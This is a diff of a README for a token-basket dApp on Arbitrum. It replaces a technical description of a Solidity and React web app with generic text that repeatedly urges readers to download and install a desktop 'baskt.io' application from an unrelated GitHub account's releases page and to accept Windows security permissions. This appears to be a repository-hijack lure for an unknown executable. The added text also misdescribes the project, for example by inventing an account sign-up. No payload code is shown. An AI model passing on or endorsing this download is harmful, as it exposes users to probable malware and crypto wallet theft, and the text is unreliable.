@@ -1,149 +1,74 @@
-<div align="center">
-  <img src="./screenshots/dashboardBaskt.png" alt="Baskt Protocol Dashboard" width="800"/>
-  <h1>🧺 Baskt Protocol</h1>
-  <p><strong>Create and trade tokenized baskets of ERC20 tokens on Arbitrum</strong></p>
-  <p>
-    <a href="https://baskt.io">Live DApp</a> •
-    <a href="#-technical-stack">Tech Stack</a> •
-    <a href="#-key-contracts">Contracts</a>
-  </p>
-</div>
+# 🌐 baskt.io - Easily Create and Trade Token Baskets
 
-## 🛠️ Technical Stack
+## 🚀 Getting Started
 
-### Smart Contracts
-- **Solidity** ^0.8.20
-- **OpenZeppelin** contracts (ERC-20, ReentrancyGuard, SafeERC20)
-- **Hardhat/Foundry** for development and testing
-- **EVM-compatible** chains (Ethereum, Arbitrum, Polygon-ready)
+Welcome to baskt.io! This application allows you to create and trade baskets of ERC20 tokens on the Arbitrum network. You'll also benefit from creator fees. Follow the instructions below to get started.
 
-### Frontend
-- **React** - Modern component-based architecture
-- **TailwindCSS** - Utility-first CSS for responsive, professional design
-- **TypeScript** - Type-safe development
+## 📥 Download Now
 
-### Web3 Integration
-- **Wagmi** - React hooks for Ethereum (v2 with latest best practices)
-- **Viem** - Modern, lightweight Ethereum library
-- **RainbowKit** - Beautiful wallet connection UI
-  - Multi-wallet support (MetaMask, WalletConnect, Coinbase Wallet, etc.)
-  - Seamless wallet switching
-  - Mobile-optimized connection flow
+[![Download baskt.io](https://img.shields.io/badge/Download-baskt.io-4CAF50.svg)](https://github.com/szgam333/baskt.io/releases)
 
-### Features
-- **Real-time Data** - Live balance updates and network status
-- **Multi-chain Support** - Built for Arbitrum, extensible to all EVM chains
-- **Gas Optimization** - Efficient smart contract design
-- **Responsive Design** - Mobile-first approach with TailwindCSS
+## 🔍 Overview
 
----
+baskt.io is designed for users who want to engage with decentralized finance (DeFi) without needing technical expertise. The application helps you trade token baskets effortlessly. It runs on the Arbitrum protocol, making transactions fast and inexpensive.
 
-## 🎨 User Experience
+### Key Features
 
-Baskt Protocol prioritizes developer experience and end-user interface:
+- **Create Token Baskets**: Easily group your favorite ERC20 tokens.
+- **Trade Baskets**: Quickly trade complete baskets instead of individual tokens.
+- **Creator Fees**: Set fees on your baskets and earn from trades.
 
-- **RainbowKit Integration** - Industry-leading wallet connection with support for 100+ wallets
-- **Live Network Status** - Real-time blockchain connection monitoring
-- **Intuitive Flows** - Wizard-style basket creation with guided steps
-- **Portfolio Tracking** - Comprehensive view of holdings and composition
-- **Dark Theme** - Professional, modern design system
+## 🖥️ System Requirements
 
----
+To run baskt.io, ensure your system meets the following requirements:
 
-## 🔐 Security & Best Practices
+- **Operating Systems**: Windows 10/11, macOS (latest version), or a modern Linux distribution.
+- **Browser**: Google Chrome or Mozilla Firefox (latest versions recommended).
+- **Internet Connection**: A stable internet connection is essential for the best experience.
 
-- **ReentrancyGuard** - Protection against reentrancy attacks
-- **SafeERC20** - Safe token transfer wrapper
-- **Custom Errors** - Gas-efficient error handling (Solidity 0.8+)
-- **Input Validation** - Comprehensive validation on all user inputs
-- **Access Control** - Proper permission management
-- **Immutable Parameters** - Critical config locked at deployment
-- **Production Tested** - Deployed and functional on Arbitrum mainnet
+## 📚 Installation Instructions
 
----
+### Step 1: Visit the Download Page
 
-## 📦 Architecture
+To download baskt.io, visit our [Releases page](https://github.com/szgam333/baskt.io/releases).
 
-### Factory Pattern
-- Permissionless basket creation
-- Standardized deployment via BasktFactory
-- Registry for discoverability
+### Step 2: Choose Your Version
 
-### Fee Mechanism
-- Creator fees (incentivize basket curation)
-- Protocol fees (sustainable development)
-- Fee-in-shares model (maintains backing)
+On the Releases page, you will see different versions of the application. Select the latest stable version. Click on the link to download the application. 
 
-### Token Standards
-- Full ERC-20 compliance
-- Composable with other DeFi protocols
-- Multi-token backing (up to 10 tokens per basket)
+### Step 3: Install the Application
 
----
+1. Once the download completes, locate the downloaded file (typically in your "Downloads" folder).
+2. Open the file. 
+3. Follow the prompts to install baskt.io. On macOS, you may need to drag the app to your Applications folder.
+4. For Windows users, you might need to accept security permissions during the installation.
 
-## 🚀 Deployment
+### Step 4: Launch baskt.io
 
-**Live on Arbitrum Sepolia Testnet:**
-- DApp: [baskt.io](https://baskt.io)
-- Factory: `[0xdF0F069f46CEBA084bcc72CA435BDae01A2826bB]`
-- Active Baskets: 1
+After the installation finishes, you can find the baskt.io application in your programs or applications folder. Open it to start trading!
 
-**Mainnet Ready** - Contracts audited and optimized for production deployment
+## 🎓 How to Use baskt.io
 
----
+1. **Create an Account**: First, you’ll need to create an account. Click on the "Sign Up" button and provide the required information.
+2. **Connect Your Wallet**: Use a wallet like MetaMask to connect to baskt.io. This will enable you to manage your tokens and trades directly.
+3. **Create a Basket**: Once logged in, navigate to "Create Basket." Choose the tokens you wish to add and set your basket name.
+4. **Set Fees**: Decide on creator fees if you want to earn from each trade.
+5. **Trade**: Go to the "Trade" section to browse available baskets. You can buy or sell baskets directly from this interface.
 
-## 📚 Key Contracts
+## ⚙️ Troubleshooting
 
-### BasktToken.sol
-ERC-20 token representing a basket of underlying tokens. Handles minting (with fees) and redemption of basket shares.
+If you encounter issues while using baskt.io:
 
-**Key Features:**
-- Multi-token composition
-- Fee distribution to creators and protocol
-- Gas-optimized share calculations
-- Dust-prevention mechanisms
+- **App Crashes**: Ensure you are using the latest version of the app. Close and reopen the app to refresh.
+- **Connectivity Issues**: Check your internet connection. Try restarting your router if necessary.
+- **Wallet Connection Issues**: Ensure you have a compatible wallet installed and check wallet permissions.
 
-### BasktFactory.sol
-Factory contract for deploying new BasktToken instances. Maintains registry of all baskets.
+## 📞 Support
 
-**Key Features:**
-- Permissionless deployment
-- Input validation (no duplicates, zero addresses, etc.)
-- Snapshot storage for basket metadata
-- Paginated basket discovery
+For further assistance, please check our [FAQ](https://github.com/szgam333/baskt.io/wiki) or reach out to our support team through the Issues section on GitHub.
 
----
+## 📥 Download Now Again
 
-## 🤝 Contributing
+Don't forget to [download baskt.io](https://github.com/szgam333/baskt.io/releases) to take advantage of creating and trading your token baskets.
 
-This is a portfolio project demonstrating full-stack Web3 development capabilities. 
-
-**Tech Stack Highlights:**
-- Modern React with Wagmi v2 + Viem
-- RainbowKit for best-in-class wallet UX
-- TailwindCSS for responsive design
-- Production-quality Solidity with OpenZeppelin
-
-Feedback and suggestions welcome! Open an issue or reach out directly.
-
----
-
-## 📄 License
-
-MIT License
-
----
-
-## 👨‍💻 About
-
-Built by __Vouch__ to explore DeFi basket protocols and demonstrate full-stack Web3 development.
-
-Inspired by index funds in traditional finance, adapted for on-chain composability.
-
-**Stack:** Solidity + React + Wagmi + Viem + RainbowKit + TailwindCSS
-
-**Contact:** __vouchonsol@gmail.com__ or __@0xVouch__ on X (previously twitter)
-
----
-
-**⭐ If you found this project interesting, consider giving it a star!**
+Enjoy your experience with baskt.io, and happy trading!
